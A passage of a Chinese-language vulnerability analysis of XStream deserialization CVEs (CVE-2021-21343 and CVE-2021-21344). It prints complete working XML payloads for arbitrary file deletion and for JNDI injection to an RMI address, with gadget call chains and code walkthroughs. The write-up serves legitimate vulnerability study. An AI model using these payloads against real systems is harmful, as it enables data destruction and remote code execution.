<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource&#x27;&gt;</span><br><span class="line">                &lt;part&gt;</span><br><span class="line">                  &lt;dataHead&gt;</span><br><span class="line">                    &lt;tail/&gt;</span><br><span class="line">                    &lt;head&gt;</span><br><span class="line">                      &lt;data class=&#x27;com.sun.xml.internal.org.jvnet.mimepull.MemoryData&#x27;&gt;</span><br><span class="line">                        &lt;len&gt;3&lt;/len&gt;</span><br><span class="line">                        &lt;data&gt;AQID&lt;/data&gt;</span><br><span class="line">                      &lt;/data&gt;</span><br><span class="line">                    &lt;/head&gt;</span><br><span class="line">                  &lt;/dataHead&gt;</span><br><span class="line">                  &lt;contentTransferEncoding&gt;base64&lt;/contentTransferEncoding&gt;</span><br><span class="line">                  &lt;msg&gt;</span><br><span class="line">                    &lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">                      &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">                        &lt;outer-class&gt;</span><br><span class="line">                          &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">                        &lt;/outer-class&gt;</span><br><span class="line">                    &lt;/it&gt;</span><br><span class="line">                    &lt;in class=&#x27;java.io.FileInputStream&#x27;&gt;</span><br><span class="line">                      &lt;channel class=&#x27;sun.nio.ch.FileChannelImpl&#x27;&gt;</span><br><span class="line">                        &lt;closeLock/&gt;</span><br><span class="line">                        &lt;open&gt;true&lt;/open&gt;</span><br><span class="line">                        &lt;threads&gt;</span><br><span class="line">                          &lt;used&gt;-1&lt;/used&gt;</span><br><span class="line">                        &lt;/threads&gt;</span><br><span class="line">                        &lt;parent class=&#x27;sun.plugin2.ipc.unix.DomainSocketNamedPipe&#x27;&gt;</span><br><span class="line">                          &lt;sockClient&gt;</span><br><span class="line">                            &lt;fileName&gt;D:/1.txt&lt;/fileName&gt;</span><br><span class="line">                            &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">                          &lt;/sockClient&gt;</span><br><span class="line">                        &lt;/parent&gt;</span><br><span class="line">                      &lt;/channel&gt;</span><br><span class="line">                      &lt;closeLock/&gt;</span><br><span class="line">                    &lt;/in&gt;</span><br><span class="line">                  &lt;/msg&gt;</span><br><span class="line">                &lt;/part&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>其实也没删掉多少属性，和上一条链的区别在于dataSource属性变了，由URLDataSource变成了StreamingDataSource，上一条链在getMessage方法中通过getInputStream方法触发SSRF，而这一条链在getContentType方法中触发任意文件删除，进入getContentType方法中查看：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091755673.png" alt="image-20230409175532582"></p>
<p>这里的part属性在xml中未指定类型，则使用默认的MIMEPart，调用MIMEPart的getContentType方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091757519.png" alt="image-20230409175701470"></p>
<p>因为contentType在xml中未进行赋值，所以为null，然后调用getHeaders方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091758489.png" alt="image-20230409175831411"></p>
<p>同样在xml中未给headers属性赋值，所以为null，而msg在xml中写出来了，就会实例化为属性赋值，msg采用默认类型MIMEMessage，调用MIMEMessage的makeProgress方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091759567.png" alt="image-20230409175929480"></p>
<p>在makeProgress方法中，我们在xml中已经为ArrayList中存入了值，所以it.hasNext()为true，存值对应的xml如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;it class=&#x27;java.util.ArrayList$Itr&#x27;&gt;</span><br><span class="line">  &lt;expectedModCount&gt;1&lt;/expectedModCount&gt;</span><br><span class="line">    &lt;outer-class&gt;</span><br><span class="line">      &lt;com.sun.xml.internal.org.jvnet.mimepull.MIMEEvent_-EndMessage/&gt;</span><br><span class="line">    &lt;/outer-class&gt;</span><br><span class="line">&lt;/it&gt;</span><br></pre></td></tr></table></figure>

<p>进入else分支：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091802658.png" alt="image-20230409180226556"></p>
<p>在else分支中，获取了事件类型，由于我们存入的为END_MESSAGE事件，所以进入END_MESSAGE分支，在END_MESSAGE分支中调用了in.close（FileInputStream.close()）：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091802554.png" alt="image-20230409180248471"></p>
<p>在close方法中，调用了channel的close方法，同时channel我们也赋值为了FileChannelImpl类实例：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091807746.png" alt="image-20230409180749659"></p>
<p>可惜啊FileChannelImpl类实例没有close方法，只能找他的父类AbstractInterruptibleChannel的close方法了，在父类的close方法中，调用了implCloseChannel方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091811685.png" alt="image-20230409181117620"></p>
<p>同样在xml中将parent属性赋值为了DomainSocketNamedPipe类实例，所以调用DomainSocketNamedPipe类实例的close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091812411.png" alt="image-20230409181204348"></p>
<p>由于sockClient不为null，所以会调用它的close方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091813634.png" alt="image-20230409181310550"></p>
<p>sockClient赋值信息如下，未指定类型，默认为UnixDomainSocket类：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;sockClient&gt;</span><br><span class="line">  &lt;fileName&gt;D:/1.txt&lt;/fileName&gt;</span><br><span class="line">  &lt;unlinkFile&gt;true&lt;/unlinkFile&gt;</span><br><span class="line">&lt;/sockClient&gt;</span><br></pre></td></tr></table></figure>

<p>在close方法中，new一个文件，然后把文件删除：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304091815333.png" alt="image-20230409181518231"></p>
<p>至此分析完毕，调用链如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">com.sun.deploy.net.socket.UnixDomainSocket.close</span><br><span class="line">sun.plugin2.ipc.unix.DomainSocketNamedPipe.close</span><br><span class="line">sun.nio.ch.FileChannelImpl.implCloseChannel</span><br><span class="line">java.nio.channels.spi.AbstractInterruptibleChannel.close</span><br><span class="line">at java.io.FileInputStream.close</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEMessage.makeProgress</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getHeaders</span><br><span class="line">com.sun.xml.internal.org.jvnet.mimepull.MIMEPart.getContentType</span><br><span class="line">com.sun.xml.internal.ws.encoding.MIMEPartStreamingDataHandler$StreamingDataSource.getContentType</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getMessage</span><br><span class="line">com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart.getAttachments</span><br><span class="line">com.sun.xml.internal.ws.api.message.MessageWrapper.getAttachments</span><br><span class="line">com.sun.xml.internal.ws.client.ResponseContext.get</span><br><span class="line">sun.awt.datatransfer.DataTransferer$IndexedComparator.compareIndices</span><br><span class="line">sun.awt.datatransfer.DataTransferer$IndexOrderComparator.compare</span><br><span class="line">java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)</span><br><span class="line">java.util.PriorityQueue.siftDown(PriorityQueue.java:687)</span><br><span class="line">java.util.PriorityQueue.heapify(PriorityQueue.java:736)</span><br><span class="line">java.util.PriorityQueue.readObject(PriorityQueue.java:796)</span><br><span class="line">...</span><br><span class="line">java.lang.reflect.Method.invoke</span><br><span class="line">com.thoughtworks.xstream.core.util.SerializationMembers.callReadObject</span><br><span class="line">com.thoughtworks.xstream.converters.reflection.SerializableConverter.doUnmarshal</span><br><span class="line">com.thoughtworks.xstream.converters.reflection.AbstractReflectionConverter.unmarshal</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convert</span><br><span class="line">com.thoughtworks.xstream.core.AbstractReferenceUnmarshaller.convert</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.convertAnother</span><br><span class="line">com.thoughtworks.xstream.core.TreeUnmarshaller.start</span><br><span class="line">com.thoughtworks.xstream.core.AbstractTreeMarshallingStrategy.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.unmarshal</span><br><span class="line">com.thoughtworks.xstream.XStream.fromXML</span><br><span class="line">com.thoughtworks.xstream.XStream.fromXML</span><br><span class="line">org.example.Main.main</span><br></pre></td></tr></table></figure>



<h2 id="CVE-2021-21344"><a href="#CVE-2021-21344" class="headerlink" title="CVE-2021-21344"></a>CVE-2021-21344</h2><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>这个漏洞能造成JNDI注入，官方给的POC：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>getDatabaseMetaData<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方POC比较长，去除一些没必要的属性后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;default&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator class=&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;&gt;</span><br><span class="line">        &lt;indexMap class=&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message class=&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;&gt;</span><br><span class="line">              &lt;dataSource class=&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;&gt;</span><br><span class="line">                &lt;bridge class=&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;&gt;</span><br><span class="line">                  &lt;bridge class=&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;&gt;</span><br><span class="line">                    &lt;bi class=&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.rowset.JdbcRowSetImpl&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard class=&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">                          &lt;name&gt;getDatabaseMetaData&lt;/name&gt;</span><br><span class="line">                          &lt;parameter-types/&gt;</span><br><span class="line">                        &lt;/getter&gt;</span><br><span class="line">                      &lt;/inheritedAttWildcard&gt;</span><br><span class="line">                    &lt;/bi&gt;</span><br><span class="line">                    &lt;context&gt;</span><br><span class="line">                      &lt;marshallerPool class=&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;&gt;</span><br><span class="line">                        &lt;outer-class reference=&#x27;../..&#x27;/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                  &lt;javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                    &lt;default&gt;</span><br><span class="line">                      &lt;dataSource&gt;rmi://localhost:1097/Object&lt;/dataSource&gt;</span><br><span class="line">                    &lt;/default&gt;</span><br><span class="line">                  &lt;/javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>其中为一些属性赋值只是为了在到达sink方法前不会发生空指针引用异常打断执行，比如：</p>
<p>nsUriCannotBeDefaulted属性在XMLSerializer#startElement()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092116649.png" alt="image-20230409211645371"></p>
<p>localNames属性在JAXBContextImpl#getUTF8NameTable()</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092118181.png" alt="image-20230409211822115"></p>
<p>类似的还有satellites、invocationProperties、marshallerPool、namespaceURIs、uriProperties。</p>
<p>调用链和CVE-2021-21343的前半部分相同，区别在于后半部分，dataSource属性由StreamingDataSource类实例变成JAXBAttachment类实例。</p>
<p>从不同点来看，XMLMultiPart#getMessage()如下，这里从getInputStream方法进去：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092235375.png" alt="image-20230409223553299"></p>
<p>调用了asInputStream方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092239965.png" alt="image-20230409223905899"></p>
<p>在asInputStream方法中，创建bab（ByteArrayBuffer），然后传入writeTo方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092240944.png" alt="image-20230409224015890"></p>
<p>调用BridgeWrapper的marshal方法，导入创建好的JdbcRowSetImpl对象（对应jaxbObject属性）</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092244169.png" alt="image-20230409224411090"></p>
<p>BridgeWrapper的bridge属性为BridgeImpl类实例，调用marshal方法，由于该类实例（BridgeImpl）并没有对应的方法，但是父类Bridge有，所以由父类执行marshal方法：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092246018.png" alt="image-20230409224646953"></p>
<p>调用marshal方法，父类没有又回到子类（BridgeImpl）了：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092250470.png" alt="image-20230409225009411"></p>
<p>接着调用write方法，将bi（ClassBeanInfoImpl）和t（JdbcRowSetImpl）传入：</p>
<p><img src="https://raw.githubusercontent.com/CyberIKUN/picture/main/img/202304092301893.png" alt="image-20230409230115823"></p>
